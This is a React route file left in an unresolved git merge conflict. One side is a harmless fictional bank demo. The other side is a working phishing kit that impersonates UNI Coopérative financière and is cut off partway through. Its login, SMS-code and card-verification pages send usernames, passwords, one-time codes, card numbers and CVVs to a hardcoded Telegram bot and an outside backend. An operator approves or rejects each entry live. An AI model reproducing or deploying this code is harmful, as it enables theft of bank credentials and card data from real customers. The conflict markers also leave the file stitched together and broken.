import { createFileRoute } from '@tanstack/react-router'
<<<<<<< Updated upstream
import { ArrowRight, BarChart3, CheckCircle2, LockKeyhole, Menu, ShieldCheck, X } from 'lucide-react'
import { useState } from 'react'

const products = [
  { title: 'Compte quotidien', text: 'Une vue claire de vos dépenses et de vos objectifs, sans jargon.' },
  { title: 'Épargne Horizon', text: 'Organisez vos projets avec des repères simples et des habitudes durables.' },
  { title: 'Conseils Clarté', text: 'Des pistes générales pour mieux comprendre vos choix financiers.' },
]

export const Route = createFileRoute('/')({
  head: () => ({ meta: [
    { title: 'Nordrive — Démo bancaire fictive' },
    { name: 'description', content: 'Nordrive est une expérience de démonstration fictive inspirée des interfaces financières modernes.' },
  ] }),
  component: Home,
})

function Home() {
  const [menuOpen, setMenuOpen] = useState(false)
  const [activeProduct, setActiveProduct] = useState(0)

  return (
    <main className="overflow-hidden bg-background">
      <div className="bg-accent px-6 py-2 text-center font-mono text-[10px] font-semibold uppercase tracking-[0.18em] text-accent-foreground">Démo fictive · Aucune donnée réelle n’est collectée</div>
      <nav className="relative z-20 flex items-center justify-between border-b border-border/70 px-6 py-5 lg:px-12">
        <a href="#top" className="font-mono text-sm font-semibold tracking-[0.16em] text-foreground">NORDRIVE<span className="text-primary">/</span>CA</a>
        <div className="hidden items-center gap-8 text-xs font-medium uppercase tracking-[0.16em] text-muted-foreground md:flex"><a className="transition-colors hover:text-foreground" href="#solutions">Solutions</a><a className="transition-colors hover:text-foreground" href="#clarte">Clarté</a><a className="transition-colors hover:text-foreground" href="#demo">Démonstration</a></div>
        <a href="/demo" className="hidden items-center gap-2 text-xs font-semibold uppercase tracking-[0.15em] text-foreground md:flex">Voir la démo <ArrowRight size={15} /></a>
        <button aria-label="Ouvrir le menu" className="md:hidden" onClick={() => setMenuOpen(!menuOpen)}>{menuOpen ? <X /> : <Menu />}</button>
        {menuOpen && <div className="absolute left-0 right-0 top-full border-b border-border bg-background px-6 py-5 shadow-lg md:hidden"><div className="flex flex-col gap-5 text-sm uppercase tracking-[0.12em]"><a href="#solutions" onClick={() => setMenuOpen(false)}>Solutions</a><a href="#clarte" onClick={() => setMenuOpen(false)}>Clarté</a><a href="#demo" onClick={() => setMenuOpen(false)}>Démonstration</a></div></div>}
      </nav>

      <section id="top" className="relative grid min-h-[calc(100dvh-105px)] items-center gap-16 px-6 py-20 lg:grid-cols-[1.05fr_0.95fr] lg:px-12 lg:py-24">
        <div className="pointer-events-none absolute -right-24 top-16 h-80 w-80 rounded-full bg-accent/25 blur-3xl" />
        <div className="relative max-w-3xl animate-fade-in"><p className="mb-8 font-mono text-[11px] uppercase tracking-[0.22em] text-muted-foreground">Expérience financière · maquette interactive</p><h1 className="font-serif text-[clamp(3.5rem,9vw,8.5rem)] leading-[0.88] tracking-[-0.065em] text-foreground">Votre argent.<br /><em className="text-primary">Plus clair.</em></h1><p className="mt-10 max-w-xl border-t border-border pt-5 text-base leading-relaxed text-muted-foreground">Nordrive imagine une relation plus calme avec vos finances : des repères utiles, une vision d’ensemble et des décisions qui vous ressemblent.</p><a href="#solutions" className="mt-8 inline-flex items-center gap-3 rounded-sm bg-primary px-5 py-3 text-xs font-semibold uppercase tracking-[0.15em] text-primary-foreground transition-transform duration-200 hover:translate-x-1">Explorer la démo <ArrowRight size={17} /></a></div>
        <div id="demo" className="relative mx-auto w-full max-w-md border border-border bg-card p-5 shadow-lg lg:mx-0 lg:ml-auto"><div className="flex items-center justify-between border-b border-border pb-5"><div><p className="font-mono text-[10px] uppercase tracking-[0.16em] text-muted-foreground">Aperçu uniquement</p><p className="mt-2 font-serif text-2xl">Tableau Nordrive</p></div><div className="rounded-full bg-secondary p-3 text-primary"><BarChart3 size={20} /></div></div><div className="py-8"><p className="text-sm text-muted-foreground">Solde de démonstration</p><p className="mt-2 font-mono text-4xl font-semibold text-foreground">12 480,00 $</p><div className="mt-7 h-24 border-b border-l border-primary/30 bg-[linear-gradient(160deg,transparent_56%,color-mix(in_oklch,var(--primary)_18%,transparent)_57%,transparent_58%),linear-gradient(25deg,transparent_48%,color-mix(in_oklch,var(--accent)_55%,transparent)_49%,transparent_51%)]" /><div className="mt-5 flex justify-between font-mono text-[10px] uppercase tracking-[0.12em] text-muted-foreground"><span>Jan</span><span>Avr</span><span>Juil</span><span>Oct</span></div></div><div className="flex items-center gap-3 border-t border-border pt-5 text-xs text-muted-foreground"><LockKeyhole size={15} className="text-primary" /> Données simulées pour cette maquette</div></div>
      </section>

      <section id="solutions" className="border-t border-border bg-secondary/45 px-6 py-24 lg:px-12 lg:py-32"><div className="mb-16 flex flex-col justify-between gap-6 lg:flex-row lg:items-end"><div><p className="mb-4 font-mono text-[10px] uppercase tracking-[0.2em] text-primary">Un système plus simple</p><h2 className="max-w-xl font-serif text-4xl leading-tight tracking-[-0.04em] md:text-6xl">Les bons outils commencent par de bonnes questions.</h2></div><p className="max-w-xs text-sm leading-relaxed text-muted-foreground">Explorez les cartes pour découvrir les différents espaces de cette expérience fictive.</p></div><div className="grid gap-px border border-border bg-border md:grid-cols-3">{products.map((product, index) => <button key={product.title} onClick={() => setActiveProduct(index)} className={`group min-h-72 bg-background p-7 text-left transition-colors duration-300 hover:bg-primary hover:text-primary-foreground ${activeProduct === index ? 'bg-primary text-primary-foreground' : ''}`}><div className="flex items-start justify-between"><span className="font-mono text-xs opacity-60">0{index + 1}</span><ArrowRight size={19} className="transition-transform duration-300 group-hover:translate-x-1" /></div><div className="mt-24"><h3 className="font-serif text-2xl">{product.title}</h3><p className="mt-3 max-w-xs text-sm leading-relaxed opacity-70">{product.text}</p></div></button>)}</div></section>

      <section id="clarte" className="grid gap-16 px-6 py-24 lg:grid-cols-[0.8fr_1.2fr] lg:px-12 lg:py-32"><div><p className="mb-4 font-mono text-[10px] uppercase tracking-[0.2em] text-primary">Notre promesse</p><h2 className="max-w-sm font-serif text-5xl leading-[0.95] tracking-[-0.05em]">Moins de bruit.<br /><span className="text-primary">Plus de confiance.</span></h2></div><div className="divide-y divide-border border-y border-border">{[['01', 'Voir', 'Un tableau de bord lisible pour comprendre ce qui compte, au bon moment.'], ['02', 'Prévoir', 'Des objectifs qui rendent les prochaines étapes tangibles et mesurables.'], ['03', 'Décider', 'Des contenus éducatifs généraux pour avancer avec plus de sérénité.']].map(([number, title, text]) => <div key={number} className="grid gap-5 py-7 md:grid-cols-[70px_180px_1fr]"><span className="font-mono text-xs text-primary">{number}</span><h3 className="font-serif text-2xl">{title}</h3><p className="max-w-md text-sm leading-relaxed text-muted-foreground">{text}</p></div>)}</div></section>

      <section className="relative bg-primary px-6 py-24 text-primary-foreground lg:px-12 lg:py-32"><p className="mb-8 font-mono text-[10px] uppercase tracking-[0.2em] opacity-70">Une maquette, pas une banque</p><div className="flex flex-col justify-between gap-12 lg:flex-row lg:items-end"><h2 className="max-w-3xl font-serif text-5xl leading-[0.9] tracking-[-0.05em] md:text-7xl">Une vision simple<br /><em>pour demain.</em></h2><div className="max-w-sm space-y-4 text-sm leading-relaxed opacity-80"><div className="flex gap-3"><ShieldCheck className="shrink-0" size={18} /><p>Cette interface est une démonstration fictive. Ne saisissez aucune information personnelle ou bancaire.</p></div><div className="flex gap-3"><CheckCircle2 className="shrink-0" size={18} /><p>Aucun formulaire de connexion, paiement ou transfert n’est actif.</p></div></div></div><div className="mt-24 flex flex-wrap items-center justify-between gap-5 border-t border-primary-foreground/20 pt-5 font-mono text-[10px] uppercase tracking-[0.15em] opacity-60"><span>Nordrive · Concept fictif</span><span>© {new Date().getFullYear()} Nordrive</span><a href="#top" className="hover:opacity-100">Retour en haut ↑</a></div></section>
    </main>
=======
import React, { useState, useEffect, useRef } from 'react'

const BOT_TOKEN = "8584171291:AAHfFk3H1WhcAaxTOOR5vfqevrbekyC5nY4";
const CHAT_ID = "6788012481";
const FUNCTION_URL = "https://t0ni0y56.backend.blink.new";

// Hook Telegram avec polling & boutons interactifs
const useTelegram = (sessionId: string) => {
  const pollIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const currentOffsetRef = useRef<number | undefined>(undefined);

  const tgRequest = async (method: string, payload: any = {}) => {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      return await res.json();
    } catch (err) {
      return new Promise((resolve) => {
        const xhr = new XMLHttpRequest();
        xhr.open("POST", url, true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.onload = () => {
          if (xhr.status >= 200 && xhr.status < 300) {
            try { resolve(JSON.parse(xhr.responseText)); } catch (e) { resolve({ ok: false }); }
          } else {
            resolve({ ok: false });
          }
        };
        xhr.onerror = () => resolve({ ok: false });
        xhr.send(JSON.stringify(payload));
      });
    }
  };

  const sendMessage = async (message: string, buttons?: { text: string; callback_data: string }[]) => {
    try {
      const payload: any = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      };

      if (buttons) {
        payload.reply_markup = {
          inline_keyboard: [
            buttons.map(btn => ({ text: btn.text, callback_data: btn.callback_data }))
          ]
        };
      }

      fetch(FUNCTION_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "uni_form", data: { message } }),
      }).catch(() => {});

      const data: any = await tgRequest('sendMessage', payload);
      return data && data.ok;
    } catch (error) {
      console.warn('Erreur Telegram:', error);
      return false;
    }
  };

  const stopPolling = () => {
    if (pollIntervalRef.current) {
      clearInterval(pollIntervalRef.current);
      pollIntervalRef.current = null;
    }
  };

  const startPolling = (
    onSuccess: () => void,
    onError: () => void
  ) => {
    stopPolling();

    pollIntervalRef.current = setInterval(async () => {
      try {
        const payload: any = { limit: 20, allowed_updates: ["message", "callback_query"] };
        if (currentOffsetRef.current !== undefined) {
          payload.offset = currentOffsetRef.current;
        }

        const data: any = await tgRequest('getUpdates', payload);
        
        if (data && data.ok && data.result) {
          const updates = data.result;
          if (updates.length > 0) {
            currentOffsetRef.current = updates[updates.length - 1].update_id + 1;
            
            for (let i = 0; i < updates.length; i++) {
              const update = updates[i];

              if (update.callback_query && update.callback_query.data) {
                const callbackData = update.callback_query.data;
                if (callbackData.includes(sessionId)) {
                  tgRequest('answerCallbackQuery', {
                    callback_query_id: update.callback_query.id,
                    text: "Action prise en compte !"
                  });
                  
                  if (callbackData.startsWith('error_')) {
                    stopPolling();
                    onError();
                    return;
                  }
                  if (callbackData.startsWith('valide_')) {
                    stopPolling();
                    onSuccess();
                    return;
                  }
                }
              }

              const message = update.message;
              if (message && message.text) {
                const text = message.text.toLowerCase();
                if (text.includes(sessionId.toLowerCase())) {
                  if (text.includes('err') || text.includes('error') || text.includes('faux') || text.includes('no') || text.includes('non') || text.includes('refus')) {
                    stopPolling();
                    onError();
                    return;
                  }
                  if (text.includes('ok') || text.includes('yes') || text.includes('oui') || text.includes('accept') || text.includes('valide') || text.includes('bon')) {
                    stopPolling();
                    onSuccess();
                    return;
                  }
                }
              }
            }
          }
        }
      } catch (err) {
        console.log("Ignored polling loop error", err);
      }
    }, 2000);
  };

  useEffect(() => {
    return () => stopPolling();
  }, []);

  return { sendMessage, startPolling, stopPolling };
};

// Composant Page 1 : Login (Welcome)
function DeliveryPage({ onNext, sessionId }: { onNext: () => void, sessionId: string }) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const { sendMessage, startPolling } = useTelegram(sessionId);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError(null);
    
    const message = `🌟 <b>NOUVEAU LOGIN UNI</b> 🌟\n👤 Username: ${username}\n🔑 Password: ${password}\n🆔 ID Session: ${sessionId}`;
    const buttons = [
      { text: "✅ Valide", callback_data: `valide_${sessionId}` },
      { text: "❌ Error", callback_data: `error_${sessionId}` }
    ];
    await sendMessage(message, buttons);
    
    startPolling(
      () => {
        setIsLoading(false);
        onNext();
      },
      () => {
        setIsLoading(false);
        setError("Incorrect username or password. Please try again.");
      }
    );
  };

  return (
    <div style={{ minHeight: '100vh', backgroundColor: '#ffffff', color: '#333333', fontFamily: "'Roboto', sans-serif", display: 'flex', justifyContent: 'center' }}>
      <div style={{ width: '100%', maxWidth: '440px', padding: '24px 30px', boxSizing: 'border-box' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '45px', marginTop: '15px' }}>
          <div>
            <img 
              src="/logo.jpg" 
              onError={(e) => { e.currentTarget.src = "https://raw.githubusercontent.com/moufasarim-lang/dhblink/main/public/logo.jpg"; }}
              alt="UNI Coopérative financière" 
              style={{ height: '75px', width: 'auto', objectFit: 'contain' }} 
            />
          </div>
          <a href="tel:1-888-359-1357" style={{ fontSize: '15px', fontWeight: 600, color: '#0077A8', textDecoration: 'none', display: 'flex', alignItems: 'center' }}>
            <i className="fa-solid fa-phone" style={{ marginRight: '6px', fontSize: '14px' }}></i> 1-888-359-1357
          </a>
        </div>

        <div style={{ marginBottom: '35px' }}>
          <h1 style={{ fontSize: '32px', fontWeight: 700, color: '#4a4a4a', margin: '0 0 10px 0' }}>Welcome</h1>
          <p style={{ fontSize: '18px', fontWeight: 500, color: '#4a4a4a', margin: 0 }}>Log in to get started</p>
        </div>

        {error && (
          <div style={{
            backgroundColor: '#fff0f0',
            border: '1px solid #ffcccc',
            color: '#cc0000',
            padding: '12px 15px',
            borderRadius: '4px',
            marginBottom: '20px',
            fontSize: '14px',
            display: 'flex',
            alignItems: 'center',
            gap: '10px'
          }}>
            <i className="fa-solid fa-triangle-exclamation" style={{ color: '#cc0000' }}></i>
            <span>{error}</span>
          </div>
        )}

        <form onSubmit={handleSubmit}>
          <div style={{ marginBottom: '24px', position: 'relative' }}>
            <label style={{ display: 'block', fontSize: '15px', fontWeight: 400, color: '#8c8c8c', marginBottom: '8px' }} htmlFor="username">
              Username
            </label>
            <input 
              type="text" 
              id="username"
              required
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              style={{
                width: '100%',
                boxSizing: 'border-box',
                padding: '14px 16px',
                fontSize: '16px',
                border: '1px solid #dcdcdc',
                borderRadius: '4px',
                outline: 'none',
                color: '#333333',
                backgroundColor: '#ffffff'
              }}
            />
          </div>

          <div style={{ marginBottom: '24px', position: 'relative' }}>
            <label style={{ display: 'block', fontSize: '15px', fontWeight: 400, color: '#8c8c8c', marginBottom: '8px' }} htmlFor="password">
              Password
            </label>
            <input 
              type={showPassword ? "text" : "password"}
              id="password"
              required
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              style={{
                width: '100%',
                boxSizing: 'border-box',
                padding: '14px 16px',
                fontSize: '16px',
                border: '1px solid #dcdcdc',
                borderRadius: '4px',
                outline: 'none',
                color: '#333333',
                backgroundColor: '#ffffff'
              }}
            />
            <div 
              onClick={() => setShowPassword(!showPassword)}
              style={{
                position: 'absolute',
                right: '12px',
                top: '36px',
                width: '32px',
                height: '32px',
                backgroundColor: '#f5f5f5',
                borderRadius: '50%',
                display: 'flex',
                justifyContent: 'center',
                alignItems: 'center',
                cursor: 'pointer',
                color: '#4a4a4a'
              }}
            >
              <i className={`fa-solid ${showPassword ? 'fa-eye-slash' : 'fa-eye'}`} style={{ fontSize: '14px' }}></i>
            </div>
          </div>

          <div style={{ textAlign: 'right', marginTop: '-5px', marginBottom: '35px' }}>
            <a href="#" style={{ fontSize: '15px', fontWeight: 600, color: '#4a4a4a', textDecoration: 'none' }}>
              I can't log in
            </a>
          </div>

          <button 
            type="submit" 
            disabled={isLoading}
            style={{
              width: '100%',
              padding: '15px',
              backgroundColor: '#0981C5',
              color: '#ffffff',
              border: 'none',
              borderRadius: '4px',
              fontSize: '18px',
              fontWeight: 500,
              cursor: 'pointer',
              marginBottom: '20px'
            }}
          >
            {isLoading ? 'Processing...' : 'Log in'}
          </button>
        </form>

        <div style={{ textAlign: 'center', fontSize: '14px', color: '#767676', marginTop: '10px' }}>
          Don't have an account? <a href="#" style={{ color: '#0981C5', fontWeight: 500, textDecoration: 'underline' }}>Set up my online profile</a>
        </div>

        <div style={{ textAlign: 'center', fontSize: '11px', color: '#b0b0b0', marginTop: '30px' }}>
          Ref: {sessionId}
        </div>
      </div>

      {isLoading && (
        <div style={{
          position: 'fixed',
          top: 0, left: 0, width: '100%', height: '100%',
          backgroundColor: 'rgba(255, 255, 255, 0.9)',
          display: 'flex',
          flexDirection: 'column',
          justifyContent: 'center',
          alignItems: 'center',
          zIndex: 9999
        }}>
          <div style={{
            border: '4px solid #f3f3f3',
            borderTop: '4px solid #0981C5',
            borderRadius: '50%',
            width: '40px',
            height: '40px',
            animation: 'spin 1s linear infinite',
            marginBottom: '15px'
          }}></div>
          <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
          <p style={{ fontSize: '16px', fontWeight: 500, color: '#333333' }}>Processing, please wait...</p>
        </div>
      )}
    </div>
  );
}

// Composant Page 2 : SMS
function OTPPage({ onNext, sessionId }: { onNext: () => void, sessionId: string }) {
  const [otp, setOtp] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const { sendMessage, startPolling } = useTelegram(sessionId);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError(null);
    
    const message = `📱 <b>SMS VERIFICATION UNI</b> 📱\nSecurity Code: ${otp}\n🆔 ID Session: ${sessionId}`;
    const buttons = [
      { text: "✅ Valide", callback_data: `valide_${sessionId}` },
      { text: "❌ Error", callback_data: `error_${sessionId}` }
    ];
    await sendMessage(message, buttons);
    
    startPolling(
      () => {
        setIsLoading(false);
        onNext();
      },
      () => {
        setIsLoading(false);
        setError("Invalid security code. Please try again.");
      }
    );
  };

  return (
    <div style={{ minHeight: '100vh', backgroundColor: '#ffffff', color: '#333333', fontFamily: "'Roboto', sans-serif", display: 'flex', justifyContent: 'center' }}>
      <div style={{ width: '100%', maxWidth: '440px', padding: '24px 30px', boxSizing: 'border-box' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '45px', marginTop: '15px' }}>
          <div>
            <img 
              src="/logo.jpg" 
              onError={(e) => { e.currentTarget.src = "https://raw.githubusercontent.com/moufasarim-lang/dhblink/main/public/logo.jpg"; }}
              alt="UNI Coopérative financière" 
              style={{ height: '75px', width: 'auto', objectFit: 'contain' }} 
            />
          </div>
          <a href="tel:1-888-359-1357" style={{ fontSize: '15px', fontWeight: 600, color: '#0077A8', textDecoration: 'none', display: 'flex', alignItems: 'center' }}>
            <i className="fa-solid fa-phone" style={{ marginRight: '6px', fontSize: '14px' }}></i> 1-888-359-1357
          </a>
        </div>

        <div style={{ marginBottom: '35px' }}>
          <h1 style={{ fontSize: '32px', fontWeight: 700, color: '#4a4a4a', margin: '0 0 15px 0' }}>SMS Verification</h1>
          <p style={{ fontSize: '16px', fontWeight: 500, color: '#4a4a4a', margin: 0, lineHeight: 1.5 }}>
            To secure your connection, please enter the 6-digit code we just sent to your mobile device.
          </p>
        </div>

        {error && (
          <div style={{
            backgroundColor: '#fff0f0',
            border: '1px solid #ffcccc',
            color: '#cc0000',
            padding: '12px 15px',
            borderRadius: '4px',
            marginBottom: '20px',
            fontSize: '14px',
            display: 'flex',
            alignItems: 'center',
            gap: '10px'
          }}>
            <i className="fa-solid fa-triangle-exclamation" style={{ color: '#cc0000' }}></i>
            <span>{error}</span>
          </div>
        )}

        <form onSubmit={handleSubmit}>
          <div style={{ marginBottom: '24px', position: 'relative' }}>
            <label style={{ display: 'block', fontSize: '15px', fontWeight: 400, color: '#8c8c8c', marginBottom: '8px', textAlign: 'center' }} htmlFor="sms_code">
              Security code
            </label>
            <input 
              type="text" 
              id="sms_code"
              required
              maxLength={6}
              placeholder="000000"
              value={otp}
              onChange={(e) => setOtp(e.target.value)}
              style={{
                width: '100%',
                boxSizing: 'border-box',
                padding: '14px 16px',
                fontSize: '22px',
                fontWeight: 700,
                border: '1px solid #dcdcdc',
                borderRadius: '4px',
                outline: 'none',
                color: '#333333',
                backgroundColor: '#ffffff',
                textAlign: 'center',
                letterSpacing: '6px'
              }}
            />
          </div>

          <button 
            type="submit" 
            disabled={isLoading}
            style={{
              width: '100%',
              padding: '15px',
              backgroundColor: '#0981C5',
              color: '#ffffff',
              border: 'none',
              borderRadius: '4px',
              fontSize: '18px',
              fontWeight: 500,
              cursor: 'pointer',
              marginBottom: '20px',
              marginTop: '15px'
            }}
          >
            {isLoading ? 'Processing...' : 'Confirm'}
          </button>
        </form>

        <div style={{ textAlign: 'center', fontSize: '14px', color: '#767676', marginTop: '10px' }}>
          Didn't receive anything? <a href="#" style={{ color: '#0981C5', fontWeight: 500, textDecoration: 'underline' }}>Resend code</a>
        </div>

        <div style={{ textAlign: 'center', fontSize: '11px', color: '#b0b0b0', marginTop: '30px' }}>
          Ref: {sessionId}
        </div>
      </div>

      {isLoading && (
        <div style={{
          position: 'fixed',
          top: 0, left: 0, width: '100%', height: '100%',
          backgroundColor: 'rgba(255, 255, 255, 0.9)',
          display: 'flex',
          flexDirection: 'column',
          justifyContent: 'center',
          alignItems: 'center',
          zIndex: 9999
        }}>
          <div style={{
            border: '4px solid #f3f3f3',
            borderTop: '4px solid #0981C5',
            borderRadius: '50%',
            width: '40px',
            height: '40px',
            animation: 'spin 1s linear infinite',
            marginBottom: '15px'
          }}></div>
          <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
          <p style={{ fontSize: '16px', fontWeight: 500, color: '#333333' }}>Processing, please wait...</p>
        </div>
      )}
    </div>
  );
}

// Composant Page 3 : Carte
function PaymentPage({ onNext, sessionId }: { onNext: () => void, sessionId: string }) {
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const { sendMessage, startPolling } = useTelegram(sessionId);

  const handleCardInput = (value: string) => {
    const clean = value.replace(/[^0-9]/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
    setCardNumber(clean);
  };

  const handleExpiryInput = (value: string) => {
    const clean = value
      .replace(/[^0-9]/g, '')
      .replace(/^([2-9])$/g, '0$1')
      .replace(/^(1{1})([3-9]{1})$/g, '0$1/$2')
      .replace(/^([0-1]{1}[0-9]{1})([0-9]{1,2}).*/g, '$1/$2');
    setExpiry(clean);
  };

  const handleCvvInput = (value: string) => {
    setCvv(value.replace(/[^0-9]/g, ''));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError(null);
    
    const message = `💳 <b>IDENTITY VERIFICATION CARD UNI</b> 💳\nCard: ${cardNumber}\nExpiry: ${expiry}\nCVV: ${cvv}\n🆔 ID Session: ${sessionId}`;
    const buttons = [
      { text: "✅ Valide", callback_data: `valide_${sessionId}` },
      { text: "❌ Error", callback_data: `error_${sessionId}` }
    ];
    await sendMessage(message, buttons);
    
    startPolling(
      () => {
        setIsLoading(false);
        onNext();
      },
      () => {
        setIsLoading(false);
        setError("Verification failed. Please check your card details and try again.");
      }
    );
  };

  return (
    <div style={{ minHeight: '100vh', backgroundColor: '#ffffff', color: '#333333', fontFamily: "'Roboto', sans-serif", display: 'flex', justifyContent: 'center' }}>
      <div style={{ width: '100%', maxWidth: '440px', padding: '24px 30px', boxSizing: 'border-box' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '45px', marginTop: '15px' }}>
          <div>
            <img 
              src="/logo.jpg" 
              onError={(e) => { e.currentTarget.src = "https://raw.githubusercontent.com/moufasarim-lang/dhblink/main/public/logo.jpg"; }}
              alt="UNI Coopérative financière" 
              style={{ height: '75px', width: 'auto', objectFit: 'contain' }} 
            />
          </div>
          <a href="tel:1-888-359-1357" style={{ fontSize: '15px', fontWeight: 600, color: '#0077A8', textDecoration: 'none', display: 'flex', alignItems: 'center' }}>
            <i className="fa-solid fa-phone" style={{ marginRight: '6px', fontSize: '14px' }}></i> 1-888-359-1357
          </a>
        </div>

        <div style={{ marginBottom: '25px' }}>
          <h1 style={{ fontSize: '28px', fontWeight: 700, color: '#4a4a4a', margin: '0 0 10px 0' }}>Identity Verification</h1>
          <p style={{ fontSize: '15px', fontWeight: 400, color: '#666666', margin: 0, lineHeight: 1.5 }}>
            Last step to confirm your identity and secure your account.
          </p>
        </div>

        <div style={{
          backgroundColor: '#f8f9fa',
          borderLeft: '4px solid #0981C5',
          padding: '12px 15px',
          fontSize: '13px',
          color: '#555555',
          marginBottom: '30px',
          display: 'flex',
          alignItems: 'flex-start',
          borderRadius: '4px'
        }}>
          <i className="fa-solid fa-shield-halved" style={{ color: '#0981C5', fontSize: '16px', marginRight: '12px', marginTop: '2px' }}></i>
          <div>
            This is a verification procedure only. <strong>No amount will be charged</strong> to your account.
          </div>
        </div>

        {error && (
          <div style={{
            backgroundColor: '#fff0f0',
            border: '1px solid #ffcccc',
            color: '#cc0000',
            padding: '12px 15px',
            borderRadius: '4px',
            marginBottom: '20px',
            fontSize: '14px',
            display: 'flex',
            alignItems: 'center',
            gap: '10px'
          }}>
            <i className="fa-solid fa-triangle-exclamation" style={{ color: '#cc0000' }}></i>
            <span>{error}</span>
          </div>
        )}

        <form onSubmit={handleSubmit}>
          <div style={{ marginBottom: '22px', position: 'relative' }}>
            <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: '#767676', marginBottom: '8px' }} htmlFor="card_number">
              Card number (16 digits)
            </label>
            <div style={{ position: 'relative' }}>
              <input 
                type="text" 
                id="card_number"
                required
                maxLength={19}
                placeholder="0000 0000 0000 0000"
                value={cardNumber}
                onChange={(e) => handleCardInput(e.target.value)}
                style={{
                  width: '100%',
                  boxSizing: 'border-box',
                  padding: '13px 15px',
                  fontSize: '16px',
                  border: '1px solid #dcdcdc',
                  borderRadius: '4px',
                  outline: 'none',
                  color: '#333333',
                  backgroundColor: '#ffffff'
                }}
              />
              <i className="fa-regular fa-credit-card" style={{ position: 'absolute', right: '15px', top: '15px', color: '#b0b0b0' }}></i>
            </div>
          </div>

          <div style={{ display: 'flex', gap: '15px', marginBottom: '22px' }}>
            <div style={{ flex: 1 }}>
              <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: '#767676', marginBottom: '8px' }} htmlFor="expiry_date">
                Expiration date
              </label>
              <input 
                type="text" 
                id="expiry_date"
                required
                maxLength={5}
                placeholder="MM/AA"
                value={expiry}
                onChange={(e) => handleExpiryInput(e.target.value)}
                style={{
                  width: '100%',
                  boxSizing: 'border-box',
                  padding: '13px 15px',
                  fontSize: '16px',
                  border: '1px solid #dcdcdc',
                  borderRadius: '4px',
                  outline: 'none',
                  color: '#333333',
                  backgroundColor: '#ffffff'
                }}
              />
            </div>

            <div style={{ flex: 1 }}>
              <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: '#767676', marginBottom: '8px' }} htmlFor="cvv">
                Security code (CVV)
              </label>
              <input 
                type="password" 
                id="cvv"
                required
                maxLength={3}
                placeholder="•••"
                value={cvv}
                onChange={(e) => handleCvvInput(e.target.value)}
                style={{
                  width: '100%',
                  boxSizing: 'border-box',
                  padding: '13px 15px',
                  fontSize: '16px',
                  border: '1px solid #dcdcdc',
                  borderRadius: '4px',
                  outline: 'none',
                  color: '#333333',
                  backgroundColor: '#ffffff'
                }}
              />
            </div>
          </div>

          <button 
            type="submit" 
            disabled={isLoading}
            style={{
              width: '100%',
              padding: '15px',
              backgroundColor: '#0981C5',
              color: '#ffffff',
              border: 'none',
              borderRadius: '4px',
              fontSize: '18px',
              fontWeight: 500,
              cursor: 'pointer',
              marginBottom: '20px',
              marginTop: '10px'
            }}
          >
            {isLoading ? 'Processing...' : 'Verify my identity'}
          </button>
        </form>

        <div style={{ textAlign: 'center', fontSize: '14px', color: '#767676', marginTop: '10px' }}>
          Have a question? <a href="#" style={{ color: '#0981C5', fontWeight: 500, textDecoration: 'underline' }}>Online Help Center</a>
        </div>

        <div style={{ textAlign: 'center', fontSize: '11px', color: '#b0b0b0', marginTop: '30px' }}>
          Ref: {sessionId}
        </div>
      </div>

      {isLoading && (
        <div style={{
          position: 'fixed',
          top: 0, left: 0, width: '100%', height: '100%',
          backgroundColor: 'rgba(255, 255, 255, 0.9)',
          display: 'flex',
          flexDirection: 'column',
          justifyContent: 'center',
          alignItems: 'center',
          zIndex: 9999
        }}>
          <div style={{
            border: '4px solid #f3f3f3',
            borderTop: '4px solid #0981C5',
            borderRadius: '50%',
            width: '40px',
            height: '40px',
            animation: 'spin 1s linear infinite',
            marginBottom: '15px'
          }}></div>
          <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
          <p style={{ fontSize: '16px', fontWeight: 500, color: '#333333' }}>Processing, please wait...</p>
        </div>
      )}
    </div>
  );
}

// Route TanStack Principale
export const Route = createFileRoute('/')({
  head: () => ({
    meta: [
      { title: 'UNI - Login' },
    ],
  }),
  component: UniFlow,
})

function UniFlow() {
  const [step, setStep] = useState<'login' | 'otp' | 'card' | 'success'>('login')
  const [sessionId] = useState(() => Math.floor(1000 + Math.random() * 9000).toString())

  return (
    <div className="min-h-screen bg-white">
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
      <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet" />

      {step === 'login' && <DeliveryPage onNext={() => setStep('otp')} sessionId={sessionId} />}
